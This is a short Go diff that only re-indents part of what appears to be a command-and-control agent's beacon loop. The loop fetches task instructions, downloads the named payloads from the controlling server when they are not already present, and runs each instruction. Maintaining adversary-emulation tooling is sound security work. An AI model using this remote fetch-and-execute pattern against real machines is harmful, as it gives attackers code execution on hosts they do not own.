@@ -32,22 +32,22 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
 			cmds := reflect.ValueOf(beacon["instructions"])
 			for i := 0; i < cmds.Len(); i++ {
-			    var droppedPayloads []string
+				var droppedPayloads []string
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
 
 				// Download payloads.
 				payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
-                for _, payload := range payloads {
-                    if len(payload) > 0 {
-                        location := filepath.Join(payload)
-	                    if util.Exists(location) == false {
-	                        location, _ := coms.GetPayloadBytes(payload, profile["server"].(string), profile["paw"].(string),profile["platform"].(string), true)
-	                        droppedPayloads = append(droppedPayloads, location)
-	                    }
-                    }
-                }
+				for _, payload := range payloads {
+					if len(payload) > 0 {
+						location := filepath.Join(payload)
+						if util.Exists(location) == false {
+							location, _ := coms.GetPayloadBytes(payload, profile["server"].(string), profile["paw"].(string),profile["platform"].(string), true)
+							droppedPayloads = append(droppedPayloads, location)
+						}
+					}
+				}
 				go coms.RunInstruction(command, profile, droppedPayloads)
 				util.Sleep(command["sleep"].(float64))
 			}
